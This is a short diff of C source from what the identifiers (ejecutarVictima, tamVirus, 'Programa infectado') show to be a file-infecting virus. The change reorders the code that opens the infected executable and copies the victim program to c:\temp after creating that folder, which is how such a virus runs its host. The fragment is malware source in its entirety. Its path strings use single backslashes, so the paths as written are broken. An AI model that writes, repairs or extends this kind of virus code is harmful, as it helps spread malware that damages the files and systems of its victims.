@@ -79,15 +79,14 @@ void ejecutarVictima(char *miNombre){
     char buff[2048];
     
     char *tempName="c:\temp\temp.exe";
-    
-    infectado=fopen(miNombre,"rb"); //Programa infectado
-    temp=fopen(tempName,"ab+");//Programa copiado a carpeta Temporal
-    x=tamVirus;
-    
     struct stat st = {0};
     if (stat("c:\temp", &st) == -1) {
       mkdir("c:\temp", 0700);
     }
+    infectado=fopen(miNombre,"rb"); //Programa infectado
+    temp=fopen(tempName,"ab+");//Programa copiado a carpeta Temporal
+    x=tamVirus;
+    
   }
 
   else{
